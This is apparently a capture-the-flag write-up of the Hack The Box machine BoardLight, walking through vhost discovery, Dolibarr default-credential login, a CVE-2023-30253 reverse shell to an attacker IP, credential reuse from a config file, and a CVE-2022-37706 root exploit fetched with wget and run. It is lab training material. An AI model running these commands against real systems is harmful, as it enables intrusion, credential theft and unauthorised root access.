# Hack The Box Writeup: BoardLight

**Difficulty:** Easy  
**OS:** Linux  
**Platform:** Hack The Box  
**Target IP:** `10.129.x.x`  
**Attack Path:** Web Application (Dolibarr) → RCE (CVE-2023-30253) → User Access → Privilege Escalation (CVE-2022-37706) → Root

---

## 1. Reconnaissance

I started with a standard Nmap scan to identify open ports and running services.

```bash
nmap -p- --min-rate 5000 -T4 <TARGET_IP>
```

The scan revealed two open ports:

- **Port 22 (SSH):** OpenSSH (likely Ubuntu)
- **Port 80 (HTTP):** Apache 2.4.41 (Ubuntu)

Visiting the web server at `http://<TARGET_IP>/` displayed a static HTML website for "BoardLight," a cybersecurity consulting firm.

The page contained an email address: `info@board.htb`, which revealed the domain name `board.htb`.

I added the domain to `/etc/hosts`:

```bash
echo "<TARGET_IP> board.htb" | sudo tee -a /etc/hosts
```

### Vhost Fuzzing

Since the main website was entirely static, I suspected that another virtual host might contain the actual web application.

I used Gobuster to enumerate virtual hosts:

```bash
gobuster vhost -u http://board.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 50
```

**Result:** A new virtual host was discovered:

- `crm.board.htb` (Status: 200, Size: 6360)

I added it to `/etc/hosts`:

```bash
echo "<TARGET_IP> crm.board.htb" | sudo tee -a /etc/hosts
```

Navigating to `http://crm.board.htb/` revealed a Dolibarr ERP/CRM login page.

---

## 2. Foothold (Initial Access)

The Dolibarr instance was running version **17.0.0**.

A quick search revealed that this version is vulnerable to **CVE-2023-30253**, a Remote Code Execution (RCE) vulnerability in the website builder module.

The vulnerability allows an authenticated user to inject PHP code into a page and execute system commands.

### Exploiting CVE-2023-30253

I first attempted to log in using the default Dolibarr credentials. The default credentials were accepted, granting access to the administration panel.

I then used a public Python exploit for CVE-2023-30253 to create a malicious website page containing a PHP reverse shell.

First, I started a Netcat listener on my attacking machine:

```bash
nc -lvnp 4444
```

After updating the session cookie in the exploit script with my valid session, I executed it:

```bash
python3 exploit.py http://crm.board.htb <USERNAME> <PASSWORD> <ATTACKER_IP> 4444
```

**Result:** A reverse shell was successfully established as the `www-data` user.

---

## 3. Lateral Movement (www-data → larissa)

With initial access obtained as `www-data`, I began searching for configuration files that might contain sensitive credentials.

I inspected the Dolibarr configuration file:

```bash
cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
```

The file contained database credentials:

- **Database User:** `<REDACTED>`
- **Database Password:** `<REDACTED>

I checked `/etc/passwd` and discovered a local user named `larissa`.

Since password reuse is a common security issue, I attempted to switch to this account using the password found in the configuration file:

```bash
su larissa
```

The password was accepted, giving me access to the `larissa` account.

I retrieved the user flag:

```bash
cat /home/larissa/user.txt
```

---

## 4. Privilege Escalation (larissa → root)

First, I checked whether `larissa` had any sudo privileges:

```bash
sudo -l
```

There were no available sudo privileges, so I moved on to enumerating SUID binaries.

```bash
find / -perm -4000 -type f 2>/dev/null
```

Among the discovered binaries, one stood out:

```text
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
```

This binary is associated with a known vulnerability: **CVE-2022-37706**.

The vulnerability exists because `enlightenment_sys` does not properly sanitize arguments passed to the `system()` function, allowing command injection and privilege escalation.

### Exploiting CVE-2022-37706

I downloaded a public exploit on my attacking machine:

```bash
git clone https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit.git
cd CVE-2022-37706-LPE-exploit
```

I started a temporary HTTP server to transfer the exploit to the target:

```bash
python3 -m http.server 8008
```

On the target machine, as `larissa`, I downloaded and executed the script:

```bash
cd /tmp
wget http://<ATTACKER_IP>:8008/exploit.sh
chmod +x exploit.sh
./exploit.sh
```

The exploit successfully triggered the vulnerability and spawned a root shell.

I verified the privileges:

```bash
id
```

**Result:**

```text
uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
```

Finally, I retrieved the root flag:

```bash
cat /root/root.txt
```

---

## 5. Conclusion

BoardLight was a straightforward Easy-difficulty machine that involved several common penetration testing techniques:

- **Enumeration:** Discovering the `crm.board.htb` virtual host through vhost fuzzing.
- **Web Exploitation:** Identifying default credentials and exploiting CVE-2023-30253 in Dolibarr to gain initial access.
- **Lateral Movement:** Extracting database credentials from `conf.php` and exploiting password reuse to access the local user `larissa`.
- **Privilege Escalation:** Exploiting the vulnerable SUID binary `enlightenment_sys` using CVE-2022-37706 to obtain root privileges.

The machine demonstrated the risks of default credentials, exposed configuration files, password reuse, and vulnerable SUID binaries.
